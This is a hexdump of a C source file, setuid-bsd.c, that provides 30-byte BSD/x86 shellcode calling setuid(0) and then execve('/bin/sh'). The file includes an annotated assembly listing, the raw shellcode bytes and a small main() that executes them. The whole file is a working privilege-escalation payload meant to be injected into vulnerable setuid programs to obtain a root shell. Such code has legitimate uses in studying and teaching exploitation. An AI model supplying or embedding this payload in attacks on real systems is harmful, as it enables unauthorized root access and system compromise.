00000000  2f 2a 0d 0a 20 2a 20 24  49 64 3a 20 73 65 74 75  |/*.. * $Id: setu|
00000010  69 64 2d 62 73 64 2e 63  2c 76 20 31 2e 36 20 32  |id-bsd.c,v 1.6 2|
00000020  30 30 34 2f 30 36 2f 30  32 20 31 32 3a 32 32 3a  |004/06/02 12:22:|
00000030  33 30 20 72 61 70 74 6f  72 20 45 78 70 20 24 0d  |30 raptor Exp $.|
00000040  0a 20 2a 0d 0a 20 2a 20  73 65 74 75 69 64 2d 62  |. *.. * setuid-b|
00000050  73 64 2e 63 20 2d 20 73  65 74 75 69 64 2f 65 78  |sd.c - setuid/ex|
00000060  65 63 76 65 20 73 68 65  6c 6c 63 6f 64 65 20 66  |ecve shellcode f|
00000070  6f 72 20 2a 42 53 44 2f  78 38 36 0d 0a 20 2a 20  |or *BSD/x86.. * |
00000080  43 6f 70 79 72 69 67 68  74 20 28 63 29 20 32 30  |Copyright (c) 20|
00000090  30 33 20 4d 61 72 63 6f  20 49 76 61 6c 64 69 20  |03 Marco Ivaldi |
000000a0  3c 20 72 61 70 74 6f 72  40 30 78 64 65 61 64 62  |< raptor@0xdeadb|
000000b0  65 65 66 2e 69 6e 66 6f  20 3e 0d 0a 20 2a 0d 0a  |eef.info >.. *..|
000000c0  20 2a 20 53 68 6f 72 74  20 73 65 74 75 69 64 28  | * Short setuid(|
000000d0  30 29 20 61 6e 64 20 2f  62 69 6e 2f 73 68 20 65  |0) and /bin/sh e|
000000e0  78 65 63 76 65 28 29 20  73 68 65 6c 6c 63 6f 64  |xecve() shellcod|
000000f0  65 20 28 62 61 73 65 64  20 6f 6e 20 65 73 64 65  |e (based on esde|
00000100  65 27 73 20 63 6f 64 65  29 2e 0d 0a 20 2a 0d 0a  |e's code)... *..|
00000110  20 2a 20 54 65 73 74 65  64 20 6f 6e 20 4f 70 65  | * Tested on Ope|
00000120  6e 42 53 44 20 61 6e 64  20 46 72 65 65 42 53 44  |nBSD and FreeBSD|
00000130  2e 0d 0a 20 2a 2f 0d 0a  0d 0a 2f 2a 0d 0a 20 2a  |... */..../*.. *|
00000140  20 73 65 74 75 69 64 28  30 29 0d 0a 20 2a 0d 0a  | setuid(0).. *..|
00000150  20 2a 20 32 30 63 38 3a  20 20 20 20 20 20 20 33  | * 20c8:       3|
00000160  31 20 63 30 20 20 20 20  20 20 20 20 20 20 20 20  |1 c0            |
00000170  20 20 20 20 20 20 20 78  6f 72 20 20 20 20 25 65  |       xor    %e|
00000180  61 78 2c 25 65 61 78 0d  0a 20 2a 20 32 30 63 61  |ax,%eax.. * 20ca|
00000190  3a 20 20 20 20 20 20 20  35 30 20 20 20 20 20 20  |:       50      |
000001a0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000001b0  70 75 73 68 20 20 20 25  65 61 78 0d 0a 20 2a 20  |push   %eax.. * |
000001c0  32 30 63 62 3a 20 20 20  20 20 20 20 35 30 20 20  |20cb:       50  |
000001d0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000001e0  20 20 20 20 70 75 73 68  20 20 20 25 65 61 78 0d  |    push   %eax.|
000001f0  0a 20 2a 20 32 30 63 63  3a 20 20 20 20 20 20 20  |. * 20cc:       |
00000200  62 30 20 31 37 20 20 20  20 20 20 20 20 20 20 20  |b0 17           |
00000210  20 20 20 20 20 20 20 20  6d 6f 76 20 20 20 20 24  |        mov    $|
00000220  30 78 31 37 2c 25 61 6c  0d 0a 20 2a 20 32 30 63  |0x17,%al.. * 20c|
00000230  65 3a 20 20 20 20 20 20  20 63 64 20 38 30 20 20  |e:       cd 80  |
00000240  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000250  20 69 6e 74 20 20 20 20  24 30 78 38 30 0d 0a 20  | int    $0x80.. |
00000260  2a 0d 0a 20 2a 20 65 78  65 63 76 65 28 22 2f 62  |*.. * execve("/b|
00000270  69 6e 2f 73 68 22 2c 20  5b 22 2f 62 69 6e 2f 73  |in/sh", ["/bin/s|
00000280  68 22 5d 2c 20 4e 55 4c  4c 29 0d 0a 20 2a 0d 0a  |h"], NULL).. *..|
00000290  20 2a 20 32 30 64 30 3a  20 20 20 20 20 20 20 33  | * 20d0:       3|
000002a0  31 20 63 30 20 20 20 20  20 20 20 20 20 20 20 20  |1 c0            |
000002b0  20 20 20 20 20 20 20 78  6f 72 20 20 20 20 25 65  |       xor    %e|
000002c0  61 78 2c 25 65 61 78 0d  0a 20 2a 20 32 30 64 32  |ax,%eax.. * 20d2|
000002d0  3a 20 20 20 20 20 20 20  35 30 20 20 20 20 20 20  |:       50      |
000002e0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000002f0  70 75 73 68 20 20 20 25  65 61 78 0d 0a 20 2a 20  |push   %eax.. * |
00000300  32 30 64 33 3a 20 20 20  20 20 20 20 36 38 20 32  |20d3:       68 2|
00000310  66 20 32 66 20 37 33 20  36 38 20 20 20 20 20 20  |f 2f 73 68      |
00000320  20 20 20 20 70 75 73 68  20 20 20 24 30 78 36 38  |    push   $0x68|
00000330  37 33 32 66 32 66 0d 0a  20 2a 20 32 30 64 38 3a  |732f2f.. * 20d8:|
00000340  20 20 20 20 20 20 20 36  38 20 32 66 20 36 32 20  |       68 2f 62 |
00000350  36 39 20 36 65 20 20 20  20 20 20 20 20 20 20 70  |69 6e          p|
00000360  75 73 68 20 20 20 24 30  78 36 65 36 39 36 32 32  |ush   $0x6e69622|
00000370  66 0d 0a 20 2a 20 32 30  64 64 3a 20 20 20 20 20  |f.. * 20dd:     |
00000380  20 20 38 39 20 65 33 20  20 20 20 20 20 20 20 20  |  89 e3         |
00000390  20 20 20 20 20 20 20 20  20 20 6d 6f 76 20 20 20  |          mov   |
000003a0  20 25 65 73 70 2c 25 65  62 78 0d 0a 20 2a 20 32  | %esp,%ebx.. * 2|
000003b0  30 64 66 3a 20 20 20 20  20 20 20 35 30 20 20 20  |0df:       50   |
000003c0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000003d0  20 20 20 70 75 73 68 20  20 20 25 65 61 78 0d 0a  |   push   %eax..|
000003e0  20 2a 20 32 30 65 30 3a  20 20 20 20 20 20 20 35  | * 20e0:       5|
000003f0  34 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |4               |
00000400  20 20 20 20 20 20 20 70  75 73 68 20 20 20 25 65  |       push   %e|
00000410  73 70 0d 0a 20 2a 20 32  30 65 31 3a 20 20 20 20  |sp.. * 20e1:    |
00000420  20 20 20 35 33 20 20 20  20 20 20 20 20 20 20 20  |   53           |
00000430  20 20 20 20 20 20 20 20  20 20 20 70 75 73 68 20  |           push |
00000440  20 20 25 65 62 78 0d 0a  20 2a 20 32 30 65 32 3a  |  %ebx.. * 20e2:|
00000450  20 20 20 20 20 20 20 35  30 20 20 20 20 20 20 20  |       50       |
00000460  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 70  |               p|
00000470  75 73 68 20 20 20 25 65  61 78 0d 0a 20 2a 20 32  |ush   %eax.. * 2|
00000480  30 65 33 3a 20 20 20 20  20 20 20 62 30 20 33 62  |0e3:       b0 3b|
00000490  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000004a0  20 20 20 6d 6f 76 20 20  20 20 24 30 78 33 62 2c  |   mov    $0x3b,|
000004b0  25 61 6c 0d 0a 20 2a 20  32 30 65 35 3a 20 20 20  |%al.. * 20e5:   |
000004c0  20 20 20 20 63 64 20 38  30 20 20 20 20 20 20 20  |    cd 80       |
000004d0  20 20 20 20 20 20 20 20  20 20 20 20 69 6e 74 20  |            int |
000004e0  20 20 20 24 30 78 38 30  0d 0a 20 2a 2f 0d 0a 0d  |   $0x80.. */...|
000004f0  0a 63 68 61 72 20 73 63  5b 5d 20 3d 20 2f 2a 20  |.char sc[] = /* |
00000500  37 20 2b 20 32 33 20 3d  20 33 30 20 62 79 74 65  |7 + 23 = 30 byte|
00000510  73 20 2a 2f 0d 0a 22 5c  78 33 31 5c 78 63 30 5c  |s */.."\x31\xc0\|
00000520  78 35 30 5c 78 35 30 5c  78 62 30 5c 78 31 37 5c  |x50\x50\xb0\x17\|
00000530  78 63 64 5c 78 38 30 22  0d 0a 22 5c 78 33 31 5c  |xcd\x80".."\x31\|
00000540  78 63 30 5c 78 35 30 5c  78 36 38 2f 2f 73 68 5c  |xc0\x50\x68//sh\|
00000550  78 36 38 2f 62 69 6e 5c  78 38 39 5c 78 65 33 5c  |x68/bin\x89\xe3\|
00000560  78 35 30 5c 78 35 34 5c  78 35 33 5c 78 35 30 5c  |x50\x54\x53\x50\|
00000570  78 62 30 5c 78 33 62 5c  78 63 64 5c 78 38 30 22  |xb0\x3b\xcd\x80"|
00000580  3b 0d 0a 0d 0a 6d 61 69  6e 28 29 0d 0a 7b 0d 0a  |;....main()..{..|
00000590  09 69 6e 74 20 28 2a 66  29 28 29 20 3d 20 28 69  |.int (*f)() = (i|
000005a0  6e 74 20 28 2a 29 28 29  29 73 63 3b 20 66 28 29  |nt (*)())sc; f()|
000005b0  3b 0d 0a 7d                                       |;..}|
000005b4
